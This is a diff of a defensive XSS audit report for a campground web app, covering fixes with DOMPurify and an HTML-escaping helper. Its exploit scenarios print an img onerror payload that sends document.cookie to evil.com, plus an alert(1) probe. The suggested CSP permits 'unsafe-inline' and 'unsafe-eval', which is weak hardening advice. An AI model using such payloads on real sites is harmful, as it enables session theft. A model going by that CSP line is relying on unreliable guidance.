@@ -19,19 +19,22 @@ Completed security audit of Cross-Site Scripting (XSS) vulnerabilities in the Ca
 **Affected Users**: All public visitors viewing campground pages
 
 **Vulnerability**:
+
 ```tsx
 dangerouslySetInnerHTML={{ __html: campground.description }}
 ```
 
 **Fix Applied**:
+
 ```tsx
 dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(campground.description || "") }}
 ```
 
 **Exploit Scenario**:
+
 1. Attacker creates/edits campground with malicious description:
    ```html
-   <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
+   <img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)" />
    ```
 2. Any user visiting the campground page executes the script
 3. Session token/cookies sent to attacker's server
@@ -50,28 +53,33 @@ dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(campground.description || 
 **Affected Users**: All users using the campground search map
 
 **Vulnerability**:
+
 ```tsx
 <h3 class="font-bold text-slate-900">${campground.name}</h3>
 <p class="text-sm text-slate-600">${campground.city}, ${campground.state}</p>
 ```
 
 **Fix Applied**:
+
 ```tsx
 <h3 class="font-bold text-slate-900">${escapeHtml(campground.name)}</h3>
 <p class="text-sm text-slate-600">${escapeHtml(campground.city)}, ${escapeHtml(campground.state)}</p>
 ```
 
 **Helper Function Added**:
+
 ```typescript
 const escapeHtml = (str: string): string =>
-  str.replace(/&/g, "&amp;")
-     .replace(/</g, "&lt;")
-     .replace(/>/g, "&gt;")
-     .replace(/"/g, "&quot;")
-     .replace(/'/g, "&#039;");
+  str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
 ```
 
 **Exploit Scenario**:
+
 1. Attacker creates campground with name: `<img src=x onerror=alert(1)>`
 2. User clicks on campground marker on map
 3. Popup displays with malicious code executing
@@ -114,11 +122,13 @@ The following files use `dangerouslySetInnerHTML` but are **SAFE** from XSS:
 ### Immediate (Next Sprint)
 
 1. **CSP Headers**: Implement Content Security Policy
+
    ```
    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
    ```
 
 2. **ESLint Rule**: Add rule to flag `dangerouslySetInnerHTML`
+
    ```json
    {
      "react/no-danger": "warn",
@@ -169,18 +179,21 @@ The following files use `dangerouslySetInnerHTML` but are **SAFE** from XSS:
 ## Impact Assessment
 
 **Before Fix**:
+
 - 2 HIGH severity XSS vulnerabilities
 - Entire public-facing site vulnerable
 - Potential for mass account compromise
 - Regulatory compliance risk (PCI-DSS, GDPR)
 
 **After Fix**:
+
 - All known XSS vulnerabilities patched
 - DOMPurify provides defense-in-depth
 - HTML escape function for template strings
 - Reduced attack surface significantly
 
 **Residual Risk**:
+
 - Medium - Other potential XSS vectors may exist
 - Medium - Dashboard template/campaign editors not yet audited
 - Low - SVG-based XSS (if SVG uploads allowed)
@@ -195,6 +208,7 @@ The following files use `dangerouslySetInnerHTML` but are **SAFE** from XSS:
 3. `/platform/apps/web/package.json` (DOMPurify dependency added)
 
 **Backups Created**:
+
 - `client.tsx.backup`
 - `CampgroundSearchMap.tsx.backup`
 
@@ -205,6 +219,7 @@ The following files use `dangerouslySetInnerHTML` but are **SAFE** from XSS:
 Security audit completed. All identified XSS vulnerabilities have been remediated with industry-standard sanitization techniques. Recommend deployment to production after manual testing.
 
 **Next Steps**:
+
 1. Manual browser testing of fixes
 2. Deploy to staging environment
 3. QA validation
